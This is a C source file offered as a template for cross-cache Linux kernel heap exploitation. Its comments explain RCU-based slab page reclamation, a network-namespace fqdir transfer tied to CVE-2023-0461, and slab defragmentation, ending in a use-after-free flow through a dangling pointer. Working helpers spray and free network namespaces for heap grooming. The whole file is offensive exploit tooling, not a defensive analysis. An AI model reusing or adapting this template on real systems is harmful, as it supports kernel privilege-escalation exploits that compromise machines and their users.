/*
 * Cross-Cache Attack Template
 *
 * When the vulnerable object's slab cache doesn't match any available
 * spray object, use cross-cache techniques to bridge the gap.
 *
 * Technique 1: RCU-based page reclamation
 *   - Free all objects in a slab page
 *   - Wait for RCU grace period (slab returned to page allocator)
 *   - Allocate from different cache (claims the same physical page)
 *
 * Technique 2: Cache transfer via intermediate object
 *   - Use an intermediate object that straddles two caches
 *   - Free intermediate's sub-allocation in target cache
 *
 * Technique 3: fqdir-based transfer (kmalloc-512 -> dyn-kmalloc-1k)
 *   - Each CLONE_NEWNET allocates 4 kmalloc-512 + 3 fqdir objects
 *   - fqdir->bucket_table in dyn-kmalloc-1k
 *   - Useful for TLS context (kmalloc-512) exploitation
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/wait.h>
#include <sys/types.h>

/* ============================================================
 * Technique 1: Drain slab page via RCU
 * ============================================================ */

/*
 * Strategy:
 * 1. Spray N objects to fill multiple slab pages
 * 2. Free objects from one specific page (need to identify which)
 * 3. Once all objects in a page are freed -> page returned to allocator
 * 4. Sleep for RCU grace period
 * 5. Allocate from different cache to reclaim the page
 *
 * Typical RCU grace period: 1-6 seconds (conservative)
 */
#define RCU_GRACE_PERIOD_SEC  2  /* Adjust based on kernel version */

void wait_for_rcu(void) {
    sleep(RCU_GRACE_PERIOD_SEC);
}

/* ============================================================
 * Technique 2: fqdir-based cache transfer
 * (Used in CVE-2023-0461 for kmalloc-512 -> dyn-kmalloc-1k)
 * ============================================================ */

/*
 * Each network namespace creation (CLONE_NEWNET) allocates:
 *   - 4 x kmalloc-512 objects (net_generic, etc.)
 *   - 3 x fqdir structures (one per L3 protocol)
 *   - Each fqdir has a bucket_table in dyn-kmalloc-1k
 *
 * This creates a bridge: free a kmalloc-512 object, reclaim with
 * something from CLONE_NEWNET that has a sub-allocation in another cache.
 */

#define NETNS_SPRAY_COUNT  0x80

static pid_t netns_pids[NETNS_SPRAY_COUNT];

/* Spray network namespaces to allocate fqdir objects */
int spray_netns(int count) {
    for (int i = 0; i < count && i < NETNS_SPRAY_COUNT; i++) {
        pid_t pid = fork();
        if (pid < 0) {
            perror("fork");
            return -1;
        }
        if (pid == 0) {
            /* Child: create new network namespace and wait */
            if (unshare(CLONE_NEWNET) < 0) {
                perror("unshare CLONE_NEWNET");
                _exit(1);
            }
            /* Stay alive to keep the namespace */
            pause();
            _exit(0);
        }
        netns_pids[i] = pid;
    }
    return 0;
}

/* Kill specific netns child to free its allocations */
void spray_netns_free(int idx) {
    if (netns_pids[idx] > 0) {
        kill(netns_pids[idx], SIGKILL);
        waitpid(netns_pids[idx], NULL, 0);
        netns_pids[idx] = 0;
    }
}

/* Cleanup all network namespace sprays */
void spray_netns_cleanup(int count) {
    for (int i = 0; i < count && i < NETNS_SPRAY_COUNT; i++) {
        spray_netns_free(i);
    }
}

/* ============================================================
 * Technique 3: Slab defragmentation helper
 * ============================================================ */

/*
 * Before cross-cache, defragment the target slab:
 * 1. Spray many objects to fill all partial slabs
 * 2. This forces new full slabs to be created
 * 3. Selectively free objects in a pattern:
 *    - Free every-other to create holes (fragmented)
 *    - Or free all in specific pages (for page reclaim)
 * 4. Trigger vuln to free target into a defragmented page
 * 5. Free remaining objects on same page -> page freed
 */

/*
 * Cross-cache exploitation flow:
 *
 * // Phase 1: Defragment target cache
 * spray_objects(DEFRAG_COUNT);        // Fill partial slabs
 * spray_objects_targeted(TARGET_COUNT); // Create new full slab
 *
 * // Phase 2: Free target object + drain slab page
 * trigger_vulnerability();             // Free target object
 * free_remaining_on_page();            // Free all objects on same page
 *
 * // Phase 3: Wait for RCU
 * wait_for_rcu();                      // Sleep for grace period
 *
 * // Phase 4: Reclaim from different cache
 * spray_different_cache(RECLAIM_COUNT); // Reclaim freed page
 *
 * // Phase 5: Exploit via original dangling pointer
 * use_dangling_pointer();              // Access reclaimed memory
 */
